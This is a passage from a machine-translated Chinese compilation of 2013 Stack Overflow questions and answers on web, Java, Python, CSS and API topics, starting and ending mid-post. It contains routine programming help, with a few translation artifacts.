    navigator.geolocation.getCurrentPosition(controller.geoLocation)
  }
});

App.LocateController = Ember.Controller.extend({
  geoLocation: function(location){
    this.set('latitude', location.coords.latitude);
    this.set('longitude', location.coords.longitude);
  }
}); 
```

现在您的定位控制器定义了 2 个属性“纬度”和“经度”。您可以在模板中绑定到它们。（顺便说一句，您的模板已经看起来适合绑定。）

您还可以在您的 App 实例上设置属性 this，如果您想全局访问它们，然后将绑定更改为指向“App.longitude”和“App.latitude”。

```
App.LocateController = Ember.Controller.extend({
  geoLocation: function(location){
    Ember.set(App, 'latitude', location.coords.latitude);
    Ember.set(App, 'longitude', location.coords.longitude);
  }
}); 
```

# callback - Glut：多个窗口的相同回调，确定谁在调用

> ID：15555890
> 
> 赞同：0
> 
> 时间：2013-03-21T18:57:15.477
> 
> 标签：callback, glut

我有一个使用 Glut 完成的项目，其中大多数子窗口具有相同的行为，除了不完全显示相同的东西（现在的图像）。

我想尽可能地重用代码，并决定对每个事件使用一个回调，所有窗口都将其用于特定事件。

他们是从回调内部确定哪个子窗口接收到事件的方法吗？

目标是做这样的事情（因为禁止指向成员方法的指针）：

```
MyWindow* window1;
MyWindow* window2;
MyWindow* window3;

...

void callbacksReshape(int w, int h)
{
    if("window 1")
        window1->reshape(int w, int h);
    if("window 2")
        window2->reshape(int w, int h);
    if("window 3")
        window3->reshape(int w, int h);
} 
```

谢谢大家的回答！

编辑：我知道`glutGetWindow`，问题是：`glutSetWindow`在调用回调函数之前是否会调用 Glut。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T14:33:53.793

我不确定是否`glutGetWindow`会给出正确的 ID，但经过一些测试，它似乎可以工作（Mac OSX 10.8.2 和 Fedora 3.4.6-2.fc17.x86_64）：

```
void disp()
{ return; }

void idle()
{ return; }

void reshape(int w, int h)
{
    GLuint id_fenetre = glutGetWindow();
    printf("%d has moved\n", id_fenetre);
    return;
}

int main(int argc, char *argv[])
{
    glutInit(&argc, argv);
    glutIdleFunc(idle);

    GLuint id;
    char *title = (char*)calloc(255, sizeof(char));

    for(int i = 0; i < 5; ++i)
    {
        GLuint id = glutCreateWindow("");
        sprintf(title, "%d", id);
        glutSetWindow(id);
        glutDisplayFunc(&disp);
        glutReshapeFunc(&reshape);
        glutSetWindowTitle(title);

        printf("Window %d created", id);
    }

    glutMainLoop();
    return 0;
} 
```

希望对某人有所帮助！

# node.js - 对于 Node/Mongo/NginX，哪种缓存方法最快/最轻？

> ID：15555896
> 
> 赞同：20
> 
> 时间：2013-03-21T18:57:28.507
> 
> 标签：node.js, caching, nginx, redis, varnish

我的任务是为一个客户开展一个项目，该客户拥有一个他估计每天将获得 1-2M 次点击的网站。他拥有一个包含 5800 万用户的现有数据库，这些用户需要在每次注册的基础上为新品牌播种。该网站的大部分内容都是由外部 API 提供的数据提供的，其中存储在我们的 Mongo 设置中的大部分数据是配置文件信息和保存的 API 参数。

NginX 将在端口 80 上，并在端口 8000 - 8010 上对节点集群进行负载平衡。

我的问题是如何处理缓存。我来自 LAMP 背景，所以我习惯于使用 PHP 编写静态 HTML 文件并提供这些文件以最小化 MySQL 负载，或者将 Memcached 用于需要更高级别缓存的站点。这个设置对我来说有点陌生。

**就最小的响应时间和 CPU 负载**而言，哪个是最理想的？

## 1：使用 NginX 进行页面级缓存

参考：[http ://andytson.com/blog/2010/04/page-level-caching-with-nginx/](http://andytson.com/blog/2010/04/page-level-caching-with-nginx/)

```
server {
    listen            80;
    servername        mysite.com;

    proxy_set_header  X-Real-IP  $remote_addr;
    proxy_set_header  Host       $host;

    location / {
        proxy_pass    http://localhost:8080/;
        proxy_cache   anonymous;
    }

    # don't cache admin folder, send all requests through the proxy
    location /admin {
        proxy_pass    http://localhost:8080/;
    }

    # handle static files directly. Set their expiry time to max, so they'll
    # always use the browser cache after first request
    location ~* (css|js|png|jpe?g|gif|ico)$ {
        root          /var/www/${host}/http;
        expires       max;
    }
} 
```

## 2：Redis作为缓存桶

`hash()`函数就是`numbers()`这个页面的函数：http: [//jsperf.com/hashing-strings](http://jsperf.com/hashing-strings)

```
function hash(str) {
    var res = 0,
        len = str.length;
    for (var i = 0; i < len; i++) {
        res = res * 31 + str.charCodeAt(i);
    }
    return res;
}

var apiUrl = 'https://www.myexternalapi.com/rest/someparam/someotherparam/?auth=3dfssd6s98d7f09s8df98sdef';
var key    = hash(apiUrl).toString(); // 1.8006908172911553e+136

myRedisClient.set(key,theJSONresponse, function(err) {...}); 
```

## 3：节点写入JSON文件

`hash()`函数就是`numbers()`这个页面的函数：http: [//jsperf.com/hashing-strings](http://jsperf.com/hashing-strings)

```
function hash(str) {
    var res = 0,
        len = str.length;
    for (var i = 0; i < len; i++) {
        res = res * 31 + str.charCodeAt(i);
    }
    return res;
}

var fs     = require('fs');
var apiUrl = 'https://www.myexternalapi.com/rest/someparam/someotherparam/?auth=3dfssd6s98d7f09s8df98sdef';
var key    = hash(apiUrl).toString(); // 1.8006908172911553e+136

fs.writeFile('/var/www/_cache/' + key + '.json', theJSONresponse, function(err) {...}); 
```

## 4：前面清漆

我做了一些研究和基准测试，就像这个网站上显示的那样让我远离这个解决方案，但如果它最有意义，我仍然愿意考虑它：http: [//todsul.com/nginx-varnish](http://todsul.com/nginx-varnish)

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2013-03-21T19:29:07.583

我会做一个组合，使用 Redis 缓存具有短 TTL 的会话用户 API 调用，并使用 Nginx 缓存长期 RESTless 数据和静态资产。我不会编写 JSON 文件，因为我认为文件系统 IO 将是列出的选项中最慢且 CPU 密集度最高的。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-03-25T22:53:38.410

1.  nginx 页面级缓存适用于缓存静态内容。但对于动态内容，就不好说了。例如，如果内容在上游发生更改，如何使缓存无效？

2.  Redis 非常适合内存数据存储。但我不喜欢将它用作缓存。由于内存有限，我不得不经常担心内存不足。是的，您可以为 redis 中的过期键设置策略。但这是额外的工作，仍然不如我希望它成为缓存提供程序那么好。

没有选择 3 和 4 的经验。

我很惊讶您没有在此处包含 memcache 作为选项。根据我的经验，它作为缓存提供程序是可靠的。redis 没有的一个 memcache 特性是它不能保证一个键在你指定的过期时间之前不会过期。这对数据存储不利，但它使 memcache 成为缓存的完美候选者：您无需担心用尽分配给 memcache 的内存。memcache 将删除较少使用的键（缓存较少使用），即使这些键的到期时间尚未满足。

Nginx 提供了这个内置的[memcache 模块](http://wiki.nginx.org/HttpMemcachedModule)。它很结实。如果你在网上谷歌，有很多教程。

这是我最喜欢的一个（见下面的链接）。缓存失效很容易：例如，如果一个页面在上游更新，只需从上游应用服务器中删除 memcache 键。作者声称响应时间增加了 4 倍。相信它对您的用例来说已经足够好了。

[http://www.igvita.com/2008/02/11/nginx-and-memcached-a-400-boost/](http://www.igvita.com/2008/02/11/nginx-and-memcached-a-400-boost/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-25T11:00:42.883

至于清漆，我不打算破译您找到的网站上的基准，但我可以告诉您它们是非常糟糕的数字，与真正的高流量实现没有任何共同之处（谷歌进行清漆优化并查看显示 100-200k 的基准req/s 而不是 8k）。

Nginx 也是页面缓存的一个不错的选择，每天 1-2M 的点击量你不需要极端的性能。所以选择你觉得更舒服的工作。

两个节点的解决方案确实是一个更糟糕的选择。页面缓存应该与您的动态应用程序分开，以提供可靠性和性能。

此外，如果您将 redis/memcached 用作对象缓存或常用反序列化数据的缓存，redis/memcached 将最好地帮助您扩展应用程序。

# java - 为什么在重写方法中抛出更高检查异常的类有效？

> ID：15555899
> 
> 赞同：-2
> 
> 时间：2013-03-21T18:57:34.663
> 
> 标签：java, exception

我有一个类在重写方法中抛出更高的检查异常。我知道这是不允许的，但为什么这段代码有效？

```
package personaltestlevel1;

public class OverrideExcept {

    public static void main(String args[]) {

        S1 s = new S2();
        try
        {
        s.show(); 
        }catch (NullPointerException e){
        System.out.printf(e.getMessage());
        }
    }  

}

class S1{

    public  void show() throws  NullPointerException {
        try 
        {
        System.out.println("not overriden");
        }catch (Exception e){
        throw new NullPointerException();
        }
    }
}

class S2 extends S1{

    public  void show() throws  RuntimeException {
        try
        {
        System.err.println("overriden");
        }catch (Exception e){
        throw new RuntimeException();}

    }
} 
```

我已经用检查的异常更新了我的样本 - 它无论如何都可以工作。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T19:09:23.323

让我们以下面的代码为例（有一些检查异常）：

```
public class Parent {
    public void m() throws Exception {

    }
}

public class Child extends Parent {
    public void m() throws FileNotFoundException {

    }
}

public class Client {
    public void test() {
        Parent p = new Child();
        try {
            p.m();
        } catch (Exception e) {         
            e.printStackTrace();
        }
    }
} 
```

即使`m`in`Parent`仅`Exception`在 throws 子句中声明，`Child`也允许声明`FileNotFoundException`，因为`FileNotFoundException`is-a `Exception`。

如果您查看`Client`which 调用`m`on`Parent`可以捕获in （实际对象）`FileNotFoundException`抛出的内容，只需在它中声明.`m``Child``Exception``catch`

我认为这解释了为什么允许覆盖方法抛出一个不同的检查异常或方法中被覆盖的方法的子异常是没有意义的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T19:02:37.490

您不能在重写方法中抛出更高或更广泛的异常，因为如果您使用超类引用（多态性）引用派生类对象，那么编译器将只检查由重写方法的超类版本抛出的异常类型，而不是实际派生类实现方法，在运行时解决。

**在这里您可以抛出更广泛的异常，因为它是未经检查的异常（即编译器不会打扰并检查未经检查的异常的类型）。**

但是从方法中抛出 RuntimeException 是一种不好的编程习惯。

# wysiwyg - nicEdit 不换行

> ID：15555900
> 
> 赞同：0
> 
> 时间：2013-03-21T18:57:35.617
> 
> 标签：wysiwyg, nicedit

如何在实现了 nicEdit 的文本区域上进行文本换行。当编辑器在 textarea 上时，属性不起作用并且 textarea 不换行？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T22:44:59.473

您必须将 wrap 添加到 nicEdit 主 div。

在这里寻找 wrap[有没有办法在 div 中自动换行长单词？](https://stackoverflow.com/questions/1638223/is-there-a-way-to-word-wrap-text-in-a-div)

```
$("div.nicEdit-main").addClass('wordwrap'); 
```

请参阅 jsfiddle [http://jsfiddle.net/LfxGm/上的示例](http://jsfiddle.net/LfxGm/)

# php - 如何并排对齐两个不同的 div 框？

> ID：15555907
> 
> 赞同：0
> 
> 时间：2013-03-21T18:57:46.460
> 
> 标签：php, css, html

我是代码新手，所以我不知道 div 框是否完全“不同”，但一个是我要写入的纯文本框，另一个是表单框（我已经设置好了和一切）供人们注册。

我唯一的问题是我不知道如何将两个不同的 div 框并排放置。这就是我的页面现在的样子[http://www5.picturepush.com/photo/a/12472673/640/12472673.png](http://www5.picturepush.com/photo/a/12472673/640/12472673.png) 正如你所看到的，它们在顶部并没有很好地对齐。我使用了 float 属性，使它不正确地对齐

但是，我希望它们从边界的顶部完美对齐，并且我希望在中间的两者之间稍微分开。有点像这样[http://www1.picturepush.com/photo/a/12472719/640/12472719.png](http://www1.picturepush.com/photo/a/12472719/640/12472719.png)

最好的方法是什么？谢谢您的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T19:04:44.970

```
<style>
.holder 
{
    clear:both;
}
.holder div
{
    width:100px;
    height:100px;
    float:left;
    border:1px solid #333;
    background-color:#ccc;
}
.holder .right
{
    margin-left:20px;
    border:1px solid #000;
    background-color:#333;
    }
</style>

<div class="holder">
    <div class="left"></div>
    <div class="right"></div>
</div> 
```

[http://jsfiddle.net/Y8kRx/](http://jsfiddle.net/Y8kRx/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-21T19:02:57.953

这里试试这个。给你一个 jsfiddle 的链接，你可以在其中看到你想要的实时代码。

[http://jsfiddle.net/9kNDe/](http://jsfiddle.net/9kNDe/2/)

```
 <div class="big_box">
       <div class="box">do some in here</div>
       <div class="box"> do some in here</div>
       <div class="clear"></div>
    </div>

    <style>
    .big_box {
   width: 500px;
   text-align: center;
    margin: 0 auto;
}
.box { width: 200px; float: left; border: 1px solid #000; margin: 3px; }
.clear { clear: both }
    </style> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-21T19:00:39.720

使用该`float`物业。

```
.left { float: left; } 
```

[http://www.w3schools.com/cssref/pr_class_float.asp](http://www.w3schools.com/cssref/pr_class_float.asp)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-21T19:02:58.883

```
<style type="text/css">
.container { width:500px; }
.l { width:200px; }
.r { width:200px; float: right; }
</style>

<div class="container">
  <div class="l">123</div>
  <div class="r">123</div>
</div> 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-21T19:03:05.190

该`display: inline-block`物业可能是您正在寻找的。

[工作示例](http://jsfiddle.net/QHmCh/)

HTML

```
<div id="box1"></div>
<div id="box2"></div> 
```

CSS

```
#box1, #box2 {
    width: 200px;
    height: 100px;
    position: relative;
    display: inline-block;
}

#box1 {
    background: #00FFFF;
}

#box2 {
    background: #FF00FF;
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-03-21T19:50:07.237

您可以使用 CSS 并**`display: table`**获得具有**相同高度**的框，无论其内容如何（不依赖 HTML 表格来获得此布局，这被认为是编码不佳的原因）。

这是一个演示：http: [//jsfiddle.net/gtXv5/1/](http://jsfiddle.net/gtXv5/1/)

HTML：

```
<div class="row">
    <div class="col box">same<br>height<br>as the<br>other<br>.box<br>whatever<br>the<br>content.<br></div>
    <div class="col gutter"><!-- empty "cell" --></div>
    <div class="col box">content lorem ipsum</div>
</div> 
```

CSS：

```
* {
    -webkit-box-sizing: border-box;
       -moz-box-sizing: border-box;
            box-sizing: border-box;
}
.row {
    display: table;
    table-layout: fixed;
    width: 500px;
    margin: 0 auto;
}

.col {
    display: table-cell;
}
.box {
    width: 200px;
    border: 1px solid #777;
    padding: 15px;
    text-align: center;
    color: #222;
    background-color: lightblue;
}
.gutter {
    width: 100px;
    background: transparent;
} 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-03-21T19:01:06.030

您还可以使用该`display: inline-block`属性

# ios - 需要帮助为 ios 中的可拖动对象选择父类

> ID：15555910
> 
> 赞同：0
> 
> 时间：2013-03-21T18:57:49.187
> 
> 标签：ios, xcode, cocoa-touch

我正在设计一个 iOS 应用程序，以帮助用户根据几种不同的修辞模式设计演示文稿。我想构建每个模板，使其成为一个容器，其中包含一组具有各种属性（不同的图标、边框、起始文本）的卡片状对象。然后，用户将能够添加/重新排列不同类型的卡片并对其进行编辑以设计其演示文稿。

当我为卡片构建类时，我需要它们可以在每个演示文稿中拖动，并且需要它们能够保存用户可以编辑的文本。有人可以帮我指出我应该用作这个卡片课程的家长的课程的方向吗？我见过很多使用 UIView 的例子。那是最好的起点吗？（我是 Objective C 和 Xcode 的新手。）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T19:00:30.780

`UIView`是您要查找的课程。它将允许您为文本和其他属性插入子视图，并根据命令调整其框架和位置。

至于实际拖动，您可以使用 a`UIPanGestureRecognizer`来保持简单。我有一个可用的[示例 Github](http://github.com/emperiorEric/UIGestures)，它展示了如何为单个和多个视图进行基本的拖放操作。它还显示了一些其他可能有用的手势。

# python - python sqlalchemy标签使用

> ID：15555920
> 
> 赞同：28
> 
> 时间：2013-03-21T18:58:35.477
> 
> 标签：python, sqlalchemy, alias

我知道我可以对别名使用标签方法，但我不知道如何在查询的后面使用标签元素 - 如下所示：

```
session.query(Foo.bar.label("foobar")).filter(foobar > 10).all() 
```

当然，这是行不通的，因为没有名为 foobar 的变量。这怎么可能实现？

（过度简化的例子只是为了便于理解......）

* * *

## 回答 #1

> 赞同：48
> 
> 时间：2013-03-22T05:57:22.633

顺便说一句，我相信您可以将标记的列本身用作表达式：

```
foobar = Foo.bar.label("foobar")
session.query(foobar).filter(foobar > 10).all() 
```

* * *

## 回答 #2

> 赞同：23
> 
> 时间：2013-03-21T20:47:27.060

只需将 foobar 放在引号中。它会`order_by`像这样工作：

```
session.query(Foo.bar.label("foobar")).order_by('foobar').all() 
```

对于过滤器，您可以使用原始 sql 条件：

```
session.query(Foo.bar.label("foobar")).filter("foobar > 10").all() 
```

# coldfusion - Nexmo API 和 CFHttp POST

> ID：15555921
> 
> 赞同：2
> 
> 时间：2013-03-21T18:58:37.227
> 
> 标签：coldfusion, cfhttp, nexmo

我正在尝试使用 CFHttp 发布到 Nexmo API。

[API 文档](https://www.nexmo.com/documentation/api/index.html#buy)

```
<cfhttp url="https://rest.nexmo.com/number/buy/" method="post">
    <cfhttpparam name="api_key" value="#api.key#" type="url">
    <cfhttpparam name="api_secret" value="#api.secret#" type="url">
    <cfhttpparam name="country" value="US" type="url">
    <cfhttpparam name="msisdn" value="11234567890" type="url">
</cfhttp> 
```

运行时我得到一个状态 420（错误的参数）。

我究竟做错了什么？

这是 PHP 中的一个示例：[API](https://github.com/prawnsalad/Nexmo-PHP-lib/blob/master/NexmoAccount.php)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T19:18:41.343

尝试更改为表单域

```
<cfhttp url="https://rest.nexmo.com/number/buy/" method="post">
    <cfhttpparam name="api_key" value="#api.key#" type="FormField">
    <cfhttpparam name="api_secret" value="#api.secret#" type="FormField">
    <cfhttpparam name="country" value="US" type="FormField">
    <cfhttpparam name="msisdn" value="11234567890" type="FormField">
</cfhttp> 
```

该文档正在寻找一个 POST 并且您发送一个组合帖子/获取。根据您发送的内容，您不发送变量。FormField 将解决这个问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-21T19:19:20.487

查看 API 文档，在我看来，他们期望这些字段是表单值。[这是此处文档](https://www.nexmo.com/documentation/#request)的摘录：

> **HTTP 方法**
> 
> 所有请求都通过使用 UTF-8 编码和 URL 编码值的 HTTP POST 或 GET 方法提交。
> 
> **Expected "Content-Type" for POST is "application/x-www-form-urlencoded"**, however we also support "application/json", "application/jsonrequest", "application/x-javascript", "text/json", "text/javascript", "text/x-javascript", "text/x-json" when posting parameters as a JSON object.

So try changing your code to the following:

```
<cfhttp url="https://rest.nexmo.com/number/buy/" method="post" charset="utf-8">
    <cfhttpparam name="Content-Type" value="application/x-www-form-urlencoded" type="header">
    <cfhttpparam name="Accept" value="application/xml" type="header">
    <cfhttpparam name="api_key" value="#api.key#" type="formField">
    <cfhttpparam name="api_secret" value="#api.secret#" type="formField">
    <cfhttpparam name="country" value="US" type="formField">
    <cfhttpparam name="msisdn" value="11234567890" type="formField">
</cfhttp> 
```

Note that I have the Accept header set to `application/xml`. According to the docs this could also be `application/json`. Change that value depending on what you want.

# java - 如何让 jbutton 在另一个组件中执行键盘敲击

> ID：15555923
> 
> 赞同：0
> 
> 时间：2013-03-21T18:58:40.970
> 
> 标签：java, swing, keyboard-shortcuts, jbutton

在我的 Java 应用程序中，我有一个`JFrame`带有一些按钮和一个带有键盘快捷键的 COM 组件。当用户单击它们时，我需要这些按钮来执行这些快捷方式。

例如：应该点击打印按钮来执行`Ctrl + P`。

我该如何实施？

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-21T19:07:31.140

> 应单击打印按钮执行`Ctrl + P`

击中`Ctrl + P`触发`Action`（至少，我想你正在使用键绑定）。只需将其`Action`与 the结合起来即可`JButton`。

您不应该尝试让按钮执行`Ctrl + P`. 共享`Action`, 可以看成是`JButton`和 键绑定背后的模型

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-21T19:07:51.190

您可以使用`Action`和 KeyBindings。看看这个例子：

```
import java.awt.BorderLayout;
import java.awt.Dimension;
import java.awt.event.ActionEvent;
import java.awt.event.KeyEvent;

import javax.swing.AbstractAction;
import javax.swing.JButton;
import javax.swing.JComponent;
import javax.swing.JFrame;
import javax.swing.JOptionPane;
import javax.swing.KeyStroke;
import javax.swing.SwingUtilities;

public class TestKeyBinding {

    private JFrame frame;

    public final class PrintAction extends AbstractAction {

        public PrintAction() {
            super("Print");
        }

        @Override
        public final void actionPerformed(ActionEvent e) {
            JOptionPane.showMessageDialog(frame, "Perform some printing");
        }
    }

    protected void initUI() {
        frame = new JFrame();
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        PrintAction printAction = new PrintAction();
        JButton button = new JButton("Print");
        button.registerKeyboardAction(printAction, KeyStroke.getKeyStroke(KeyEvent.VK_P, KeyEvent.CTRL_DOWN_MASK),
                JComponent.WHEN_IN_FOCUSED_WINDOW);
        button.setAction(printAction);
        JComponent comp = new JComponent() {
            @Override
            public Dimension getPreferredSize() {
                return new Dimension(100, 100);
            }
        };
        frame.add(comp, BorderLayout.NORTH);
        frame.add(button);
        frame.setSize(300, 300);
        frame.setVisible(true);
        comp.requestFocusInWindow();
    }

    public static void main(String[] args) {
        SwingUtilities.invokeLater(new Runnable() {
            @Override
            public void run() {
                new TestKeyBinding().initUI();
            }
        });
    }
} 
```

# jquery - fancybox - 使用元素作为标题

> ID：15555925
> 
> 赞同：-2
> 
> 时间：2013-03-21T18:58:41.550
> 
> 标签：jquery, fancybox

我想在一个相当大的网站上使用 fancybox 来显示弹出图像，其中一些需要标题，而另一些则不需要。

我更喜欢将标题放在隐藏的 div 元素中，因为它比使用“标题”属性更灵活。我使用了[7 中的代码。自定义标题 --> 使用元素而不是属性](http://fancyapps.com/fancybox/#instructions)。

它工作正常，除了在那些不需要标题且没有隐藏 div 元素的图像上，fancybox 然后使用链接中的标题属性作为标题，这样你就可以得到一个标题，例如，“点击放大'。

这是预期的行为吗？如果是这样，有没有办法为站点全局覆盖它（不是逐个图像）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T19:03:33.003

您可以在事后使用[qTip](http://craigsworks.com/projects/qtip2/)或[prototip 之类的东西向图片添加手动创建的工具提示](http://www.nickstakenburg.com/projects/prototip2/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T21:56:48.597

在您提到的示例中，有一个条件可以评估是否存在`div`fancybox 用作的隐藏元素`title`：

```
if (id) {
    el = $('#' + id);

    if (el.length) {
        this.title = el.html();
    }
} 
```

您唯一需要做的就是`else`向该条件添加一个语句，`title`如果标题不存在，您可以覆盖现有的

```
if (id) {
    el = $('#' + id);

    if (el.length) {
        this.title = el.html();
    }
} else {
    // don't show any title in fancybox
    this.title = "";
} 
```

请参阅**[JSFIDDLE](http://jsfiddle.net/tqe6b/)** ...最后一个图像有一个`title`属性，但没有相应的（隐藏）标题。

# php - 从 SQL db 到 XML 的匹配值

> ID：15555933
> 
> 赞同：0
> 
> 时间：2013-03-21T18:59:23.450
> 
> 标签：php, xml

我对编程很陌生，所以请耐心等待。

我有一个如下的 XML 文件：

```
<item>
 <SKU>123</SKU>
 <price>$12.99</price>
<item>
<item>
 <SKU>456</SKU>
 <price>$14.99</price>
<item> 
```

我有一个如下值的 SQL 表：

```
+----+----------+
| SKU   | Price |
+----+----------+
| 123   | $9.99 |
| 456   |$10.00 |
| 789   | $1.00 |
+----+----------+ 
```

我想从 SQL 数据库中查找每个 SKU，并查看该 SKU 是否存在于 XML 文件中。我还想将 SQL 表中的 SKU 与 XML 文件中的 SKU 进行匹配，并写出每个的价格（例如：SKU 456、14.99 美元、10.00 美元）。

我什至不知道从哪里开始。一些问题：

1) 如果我将 XML 值复制到另一个 SQL 数据库中并进行简单的内部连接，我想我可以找到一种方法。有没有办法在不将 xml 值复制到数据库的情况下做到这一点？

我应该研究的大致方向会很棒！

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T20:33:02.010

查看自 PHP 5.1.2 起可用的[SimpleXML 。](http://www.php.net/manual/en/book.simplexml.php)我知道每个人都在谈论 JSON，但目前 XML 的使用更为广泛。

```
<?php
$string = <<<XML
<?xml version='1.0'?>
<document>
<item>
 <SKU>123</SKU>
 <price>$12.99</price>
</item>
<item>
 <SKU>456</SKU>
 <price>$14.99</price>
</item>
</document>
XML;

$xml = simplexml_load_string($string);

print_r($xml);
?> 
```

# web-services - 在 NetSuite Web 服务支持案例搜索中对结果进行排序？

> ID：15555938
> 
> 赞同：1
> 
> 时间：2013-03-21T18:59:41.490
> 
> 标签：web-services, sorting, search, web, netsuite

是否可以在 Web 服务调用中设置搜索首选项以对返回的数据进行排序？

我正在使用 SupportCaseSearch 对象执行 Web 服务搜索，返回客户的支持案例以显示在我们的客户门户中。我需要通过分页结果并一次只带回一个页面来做到这一点，因为一次拉回所有支持案例需要太长时间。默认情况下，NetSuite 按内部 ID 升序返回支持案例记录。因此，对于分页，第一页包含客户拥有的最早的支持案例，因为这些案例显然具有最低的内部 ID。这对于我们的网站来说显然是不可接受的，因为客户希望首先看到他们最近的案例。

有没有办法进行搜索，其中记录将按内部 ID 的降序或最近的 lastModifiedDate 首先返回？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-07-08T01:57:08.957

使用“结果”选项卡上设置的排序顺序字段创建支持案例的已保存搜索 - 在您的情况下，为 dateCreated DESC。

使用 SupportCaseSearchAdvanced 执行保存的搜索，为客户字段动态应用过滤器。

结果将返回正确排序。

# json - 如果我不知道它是什么，如何在 AngularJS 中访问 JSON 属性名称？

> ID：15555940
> 
> 赞同：5
> 
> 时间：2013-03-21T18:59:44.507
> 
> 标签：json, angularjs

给定 JSON 对象（formData），我尝试使用 AngularJS 遍历该对象并输出**RealEstateInfo**和**PersonalTaxInfo**。对于我的生活，我似乎无法弄清楚如何获得属性名称。有任何想法吗？

顺便说一句，（键，值）不起作用。**key**给了我索引号，为整个对象**赋值。**

```
<ul>
    <li ng-repeat="item in formsData">
        {{item.value}} //What goes here to get "RealEstateInfo" the 1st loop, and "PersonalTaxInfo" the second loop?
    </li>
<ul>

$scope.formData = [
{
    "RealEstateInfo": [
    {
        "Group": "General",
        "Fields": [
        {
            "Name": "TitleType",
            "Label": "Title Type",
            "Type": "dropdown",
        },
        {
            "Name": "NameIfAvailable",
            "Label": "Name if available",
            "Type": "string"
        }]
    },
    {
         "Group": "Personal",
         "Fields": [
         {
             "Name": "TitleType",
             "Label": "Title Type",
             "Type": "dropdown",
         },
         {
             "Name": "NameIfAvailable",
             "Label": "Name if available",
             "Type": "string"
         }]
     }]
},
{
    "PersonalTaxInfo": [
    {
        "Group": "General",
        "Fields": [
        {
             "Name": "TitleType",
             "Label": "Title Type",
             "Type": "dropdown",
        },
        {
            "Name": "NameIfAvailable",
            "Label": "Name if available",
            "Type": "string"
        }]
    },
    {
        "Group": "PersonalInfo",
        "Fields": [
        {
             "Name": "TitleType",
             "Label": "Title Type",
             "Type": "dropdown",
        },
        {
             "Name": "NameIfAvailable",
             "Label": "Name if available",
             "Type": "string"
        }]
    }]
}] 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-21T19:25:30.447

请看看这个小提琴。[http://jsfiddle.net/4UTHW/](http://jsfiddle.net/4UTHW/)

```
ng-repeat="(key,value) in data" 
```

使用此语法会将对象的键分配给`key`变量，并将这些键的值分配给`value`变量。

为简洁起见，简化了 json 结构。

# apache - 在设计 Java EE 应用程序时，包 org.eclipse.swt.dnd 显示错误

> ID：15555954
> 
> 赞同：0
> 
> 时间：2013-03-21T19:00:49.873
> 
> 标签：apache, tomcat, swt

我在设计界面时遇到的问题如下：

为了结合拖放功能，我正在使用 SWT，并且所有 SWT 拖放类都在包中定义 `org.eclipse.swt.dnd`。现在我的问题是，在开发独立应用程序时，我已经包含了名为的外部 jar `swt-4.2.1-win32-win32-x86`，它工作正常。但是，在开发 Java EE 应用程序时，如果我 `org.eclipse.swt.dnd`在 jsp 页面中 包含该包，`<%@page language="java" import="org.eclipse.swt.SWT"%>`则会显示以下错误：

```
HTTP Status 500 - Unable to compile class for JSP:

--------------------------------------------------------------------------------

type Exception report

message Unable to compile class for JSP:

description The server encountered an internal error that prevented it
from fulfilling this request.

exception

org.apache.jasper.JasperException: Unable to compile class for JSP:

An error occurred at line: [16] in the generated java file:
[C:\javaPrograms\.metadata\.plugins\org.eclipse.wst.server.core\tmp3\work\Catalina\localhost\wanem\org\apache\jsp\wanem_jsp.java] 
```

只能导入一个类型。org.eclipse.swt.SWT 解析为一个包

```
Stacktrace:
        org.apache.jasper.compiler.DefaultErrorHandler.javacError(DefaultErrorHandler.java:103)
        org.apache.jasper.compiler.ErrorDispatcher.javacError(ErrorDispatcher.java:331)
        org.apache.jasper.compiler.JDTCompiler.generateClass(JDTCompiler.java:468)
        org.apache.jasper.compiler.Compiler.compile(Compiler.java:378)
        org.apache.jasper.compiler.Compiler.compile(Compiler.java:353)
        org.apache.jasper.compiler.Compiler.compile(Compiler.java:340)
        org.apache.jasper.JspCompilationContext.compile(JspCompilationContext.java:646)
        org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:357)
        org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:390)
        org.apache.jasper.servlet.JspServlet.service(JspServlet.java:334)
        javax.servlet.http.HttpServlet.service(HttpServlet.java:728)

note The full stack trace of the root cause is available in the Apache
Tomcat/7.0.37 logs. 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T23:56:23.193

SWT 用于编写桌面应用程序，不能在 JSP 中工作。您可能想看看[远程应用程序平台](http://projects.eclipse.org/projects/rt.rap)。

# c# - 为什么我在此文件上传功能中检查上传文件的大小时会出现此屏幕？

> ID：15555960
> 
> 赞同：0
> 
> 时间：2013-03-21T19:01:11.777
> 
> 标签：c#, asp.net, file-upload

在我正在处理的文件上传功能中，一个重要的问题是检查上传文件的大小。如果它大于默认大小，我应该会收到一条错误消息。但是，我得到了这个屏幕，我不知道为什么。另外，我尝试调试代码，但调试根本不起作用。它没有通过任何代码行，我不知道为什么

![在此处输入图像描述](../Images/43ef0c8d030c38086690e6ac4dfc890f.png)

```
